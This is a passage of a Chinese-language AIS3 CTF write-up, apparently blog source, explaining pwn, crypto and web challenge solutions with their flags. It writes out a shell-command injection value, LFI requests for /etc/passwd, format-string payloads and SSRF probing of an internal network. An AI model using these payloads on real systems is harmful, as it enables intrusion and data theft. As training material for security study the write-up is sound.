+<p>最簡單的 buffer overflow，裡面已經有一個函式，直接呼叫就拿到 shell 了，但是記得要跳到 <code>push rbp</code> 下一行，如果跳到 <code>push rbp</code> 的話 stack 會沒有對齊 16 的倍數，做 <code>system</code> 的時候會進到 child thread 然後跑到 <code>movaps XMMWORD PTR [rsp+0x40], xmm0</code> 因為沒對齊就掛了，然後 child thread 死掉 <code>system</code> 就會執行完跳出來 ( 都還沒打到指令 )，出來跑到函式結尾 <code>return</code> 的時候又會掛掉，因為正常呼叫函式都會把 return address 放到 stack 上，但是直接跳過去就沒有放，他就會 return 到奇怪的位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Nonsense"><a class="header-anchor" href="#Nonsense"></a>Nonsense</h3>
+<p>這題讓我們輸入 shellcode，然後會檢查 shellcode 裡面有沒有 <code>wubbalubbadubdub</code> 這段字，並且在這段字前面的每個字都要小於等於 31，而找到那段字之後就會直接跳出檢查函式，所以那段字的後面都不會被檢查了，那我們的 shellcode 就構造成最開頭先 <code>ja</code> 跳到後面真正的 shellcode，然後中間放 <code>wubbalubbadubdub</code>，就完成了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ja shellcode</span><br><span class="line">... (some padding instructions)</span><br><span class="line">wubbalubbadubdub</span><br><span class="line">shellcode:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Portal-Gun"><a class="header-anchor" href="#Portal-Gun"></a>Portal Gun</h3>
+<p>這題就是用 <code>gets</code> 的 bof，有一個函式有用到 <code>system('sh')</code>，但是他有 <code>LD_PRELOAD</code> 一個 <code>hook.so</code> 裡面把 <code>system</code> hook 掉了，所以不能直接叫，那就堆 ROP leak libc address 再自己跳進去 system 吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Morty-School"><a class="header-anchor" href="#Morty-School"></a>Morty School</h3>
+<p>這題一開始就給你 leak libc address 給你，接下來你可以挑一個 Morty 教，但你給的 index 他沒有檢查，所以可以任意寫一個位址，但是不是直接寫值上去，而是寫到你給他的位址裡面放的位址裡面的值，所以找一下哪裡有存 <code>__stack_chk_fail</code> got 的位址，利用他去寫 <code>__stack_chk_fail</code> 的 got 改成我們串好的 ROP gadgets，然後寫爆 stack（ 因為這裡也有 overflow ），就跳去做 ROP 了，一開始有想直接跳 one gadgets 但是條件都不符，所以就自己做 ROP 做 <code>system('/bin/sh')</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Death-Crystal"><a class="header-anchor" href="#Death-Crystal"></a>Death Crystal</h3>
+<p>這題是 format string，但是有檢查輸入，所有字都不能有 <code>$</code>, <code>\</code>, <code>/</code>, <code>^</code>，並且 <code>%</code> 後面都不能有 <code>c</code>, <code>p</code>, <code>n</code>, <code>h</code>，主要是不能用 <code>$</code> 去指定參數，但沒關係就多放幾個 padding 用的把參數推過去就好了，他的 <code>flag</code> 已經讀進來放到 <code>0x202060</code> 了，但是 PIE 有開所以還是要 leak 一下 code base address，要繞過檢查只要前面隨便放個數字就好了，比如 <code>%1p</code>，先 <code>b'%1p' * 11 + b';%1p'</code> leak 出 code base address，然後再 <code>b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060)</code> 就拿到 flag 了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Meeseeks-Box"><a class="header-anchor" href="#Meeseeks-Box"></a>Meeseeks Box</h3>
+<p>這題是 heap 題，很一般的有 <code>create</code>, <code>show</code>, <code>delete</code> 的題目，然後沒什麼檢查，而且是 ubuntu 18.04 有 tcache 可以用，所以先弄個夠大的 chunk 然後 free 掉他讓他進到 unsorted bins 就可以拿 libc address 了，然後有 tcache 可以隨便 double free 他去把 <code>__malloc_hook</code> 寫成 one gadget 的位址就完成了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<h3 id="Brontosaurus"><a class="header-anchor" href="#Brontosaurus"></a>Brontosaurus</h3>
+<p>給了一個檔案叫 <code>KcufsJ</code> 裡面是 jsfuck 混淆過的 js code，他的檔名就是倒過來的 jsfuck，所以內容也要倒過來，開瀏覽器 console 執行一下就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Br0n7Os4uru5_ch3at_3asi1Y&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="T-Rex"><a class="header-anchor" href="#T-Rex"></a>T-Rex</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">         !       @       #       $       %       &amp;</span><br><span class="line"></span><br><span class="line"> !       V       F       Y       J       6       1</span><br><span class="line"></span><br><span class="line"> @       5       0       M       2       9       L</span><br><span class="line"></span><br><span class="line"> #       I       W       H       S       4       Q</span><br><span class="line"></span><br><span class="line"> $       K       G       B       X       T       A</span><br><span class="line"></span><br><span class="line"> %       E       3       C       7       P       N</span><br><span class="line"></span><br><span class="line"> &amp;       U       Z       8       R       D       O</span><br><span class="line"></span><br><span class="line">&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $%  ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;#  &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;</span><br></pre></td></tr></table></figure>
+<p>給了一張表和密文，對表轉回去就好了，但要注意 row 和 column 的順序，<code>&amp;$</code> 是 A 不是 R。</p>
+<h3 id="Octopus"><a class="header-anchor" href="#Octopus"></a>Octopus</h3>
+<p>這題給 python script 和他執行後的 output，裡面在做 <a href="https://en.wikipedia.org/wiki/Quantum_key_distribution#BB84_protocol:_Charles_H._Bennett_and_Gilles_Brassard_(1984)">BB84 量子密鑰分發</a>，兩邊的 Basis 都給了，Qubits 也給了，就是把 Basis 一樣部分的那些 Qubits 抓出來轉回 binary 就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Blowfish"><a class="header-anchor" href="#Blowfish"></a>Blowfish</h3>
+<p>這題要 <code>nc 60.250.197.227 12001</code>，有給原始碼，還有一個 python pickle dump 的檔案</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&#39;name&#39;: &#39;maojui&#39;, &#39;password&#39;: &#39;SECRET&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;djosix&#39;, &#39;password&#39;: &#39;S3crE7&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;kaibro&#39;, &#39;password&#39;: &#39;GGInIn&#39;, &#39;admin&#39;: False&#125;, &#123;&#39;name&#39;: &#39;others&#39;, &#39;password&#39;: &#39;_FLAG_&#39;, &#39;admin&#39;: False&#125;]</span><br></pre></td></tr></table></figure>
+<p>連上去之後，他會給你這段用 Blowfish 的 CTR Mode 加密的結果當作 token，接著你就可以再把 token 丟回去給他解密，他會看你是不是 admin，因為是 CTR Mode 所以就翻一下 bit 就好了，把那個 False 的部分翻成 True，就這麼簡單。<br>
+詳情可以參考 <a href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">這份投影片</a> Bit-Flipping Attack 的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Camel"><a class="header-anchor" href="#Camel"></a>Camel</h3>
+<p>這題給了 sage script，裡面有一個 Elliptic Curve，並給了上面的 9 個點，flag 就是 Elliptic Curve 的參數，因為他給的點的 x 座標都是 $p-1, p+1, p+2, …$，所以帶進 $y^2 = x^3 + a x + b$ 式子 mod p 之後 p 就都不見了</p>
+<p>$$<br>
+\begin{align}<br>
+&amp;(p-1)^3 + a (p-1) + b = -1 - a + b \pmod{p} \\<br>
+&amp;(p+1)^3 + a (p+1) + b = 1 + a + b \pmod{p}<br>
+\end{align}<br>
+$$</p>
+<p>上面兩式相加之後可以得到 <code>2b</code>，還有其他兩組 <code>p+3</code>, <code>p-3</code>, <code>p+5</code>, <code>p-5</code> 也是同樣的情況，所以我們可以拿到三組 <code>2b + kp</code> 這樣形式的東西，把他們互減去做 gcd 就得到 <code>p</code> 了，有 <code>p</code> 之後就帶回去就可以得到 <code>a, b</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Turtle"><a class="header-anchor" href="#Turtle"></a>Turtle</h3>
+<p>這題就是 Padding Oracle Attack，我把以前的 script 拿出來然後把 oracle 換成用 requests 去抓就完成了。<br>
+詳情可以參考 <a href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">這份投影片</a> Padding Oracle Attack 的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5l0w_4nd_5734dy_w1n5_7h3_r4c3.&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
+<h3 id="Squirrel"><a class="header-anchor" href="#Squirrel"></a>Squirrel</h3>
+<p>這題網站在 <a href="https://squirrel.ais3.org/%EF%BC%8C%E6%89%93%E9%96%8B%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%B5%81%E9%87%8F%E6%9C%83%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E5%80%8B%E8%AB%8B%E6%B1%82%E6%98%AF">https://squirrel.ais3.org/，打開看一下流量會看到有一個請求是</a> <code>/api.php?get=/etc/passwd</code>，看起來是直接給你 local file inclusion，抓一下網站原始碼 <code>/api.php?get=/var/www/html/api.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application\/json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($file = @$_GET[<span class="string">'get'</span>]) &#123;</span><br><span class="line">    $output = shell_exec(<span class="string">"cat '$file'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($output !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'output'</span> =&gt; $output</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode([</span><br><span class="line">            <span class="string">'error'</span> =&gt; <span class="string">'cannot get file'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> json_encode([</span><br><span class="line">        <span class="string">'error'</span> =&gt; <span class="string">'empty file path'</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看起來是 command injection，<code>/api.php?get='|bash -c 'ls</code> 就可以執行任意 command 了，<code>ls /</code> 看根目錄有個 <code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code> 裡面就是 flag 了 ( 剛好檔名跟 flag 一樣，真佛心 )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Shark"><a class="header-anchor" href="#Shark"></a>Shark</h3>
+<p>這題網站在 <a href="https://shark.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E5%80%8B%E9%80%A3%E7%B5%90%E9%BB%9E%E4%B8%8B%E5%8E%BB%E5%B0%B1%E6%98%AF">https://shark.ais3.org/，首頁有個連結點下去就是</a> <code>/?path=hint.txt</code>，又是 local file inclusion，但是 hint 說</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please find the other server in the internal network! (flag is on that server)</span><br><span class="line"></span><br><span class="line">    GET http:&#x2F;&#x2F;some-internal-server&#x2F;flag</span><br></pre></td></tr></table></figure>
+<p>那就先看一下原始碼 <code>/?path=/var/www/html/index.php</code>，直接看會拿到 <code>[forbidden]</code>，那隨便繞一下 <code>/?path=file:///var/www/html/index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($path = @$_GET[<span class="string">'path'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(\.|\/)/'</span>, $path)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;[forbidden]&lt;/pre&gt;'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $content = @file_get_contents($path, <span class="keyword">FALSE</span>, <span class="keyword">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . ($content ? htmlentities($content) : <span class="string">'[empty]'</span>) . <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;🦈🦈🦈&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;🦈🦈🦈&lt;/h1&gt;</span><br><span class="line">    &lt;a href=<span class="string">"?path=hint.txt"</span>&gt;Shark never cries?&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>有用 regex 檢查開頭不能是 <code>.</code> 和 <code>/</code>，所以 <code>file://</code> 或 <code>php://filter/read=convert.base64-encode/resource=</code> 都可以繞，再來看 <code>/?path=file:///etc/hosts</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.22.0.3	02b23467485e</span><br></pre></td></tr></table></figure>
+<p>瀏覽一下 <code>/?path=http://02b23467485e</code> 發現是本機，那就找找子網路下的鄰居們，就找到 <code>/?path=http://172.22.0.2/flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Elephant"><a class="header-anchor" href="#Elephant"></a>Elephant</h3>
+<p>這題網站在 <a href="https://elephant.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%85%A5%EF%BC%8C%E9%9A%A8%E4%BE%BF%E8%BC%B8%E5%85%A5%E5%80%8B">https://elephant.ais3.org/，首頁可以登入，隨便輸入個</a> username 就登入了不需要密碼，第一步當然是找找有沒有原始碼，看了一下 <code>robots.txt</code> 沒東西，再看 <code>.git</code> 是 Forbidden，中獎，隨便找個 GitDumper 把 <code>.git</code> 抓下來，<code>git log</code> 看到前一個 commit 把原始碼刪掉了，<code>git reset --hard</code> 回去，原始碼如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSION = <span class="string">'elephant_user'</span>;</span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp($flag, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: /'</span>);</span><br><span class="line">    setcookie(SESSION, <span class="keyword">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($name = $_POST[<span class="string">'name'</span>]) &#123;</span><br><span class="line">    $user = <span class="keyword">new</span> User($name);</span><br><span class="line">    header(<span class="string">'Location: /'</span>);</span><br><span class="line">    setcookie(SESSION, base64_encode(serialize($user)), time() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($data = @$_COOKIE[SESSION]) &#123;</span><br><span class="line">    $user = unserialize(base64_decode($data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Elephant&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">'utf-8'</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> id=<span class="string">"bootstrap-css"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!$user): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">"login"</span>&gt;</span><br><span class="line">            &lt;h3 class="text-center text-white pt-5"&gt;Are you familiar with PHP?&lt;/h3&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;div id="login-row" class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                    &lt;div id="login-column" class="col-md-6"&gt;</span><br><span class="line">                        &lt;div id="login-box" class="col-md-12"&gt;</span><br><span class="line">                            &lt;form id="login-form" class="form" action="" method="post"&gt;</span><br><span class="line">                                &lt;h3 class="text-center text-info"&gt;What's your name!?&lt;/h3&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Name:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="name" id="name" class="form-control"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;input type="submit" name="submit" class="btn btn-info btn-md" value="let me in"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">        &lt;h3 class="text-center text-white pt-5"&gt;You may want to read the source code.&lt;/h3&gt;</span><br><span class="line">        &lt;div class="container" style="text-align: center"&gt;</span><br><span class="line">            &lt;img src=<span class="string">"images/elephant2.png"</span>&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                &lt;div class="col-md-6"&gt;</span><br><span class="line">                    &lt;div class="col-md-12"&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;Do you know?&lt;/h3&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;PHP's mascot is an elephant!&lt;/h3&gt;</span><br><span class="line">                        Hello, &lt;b&gt;<span class="meta">&lt;?</span>= $user-&gt;name <span class="meta">?&gt;</span>&lt;/b&gt;!</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user-&gt;canReadFlag()): <span class="meta">?&gt;</span></span><br><span class="line">                            This is your flag: &lt;b&gt;<span class="meta">&lt;?</span>= $flag <span class="meta">?&gt;</span>&lt;/b&gt;</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">                            Your token is not sufficient to read the flag!</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;a href=<span class="string">"?logout"</span>&gt;Logout!&lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>只要讓 <code>strcmp($flag, $this-&gt;token) == 0</code> 就好啦，那 <code>strcmp</code> 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 <code>NULL</code>，而這裡是用兩個 <code>=</code> 不是三個，所以 <code>NULL == 0</code>，把下面這段 base64 encode 後放回 Cookie 就完成啦。</p>
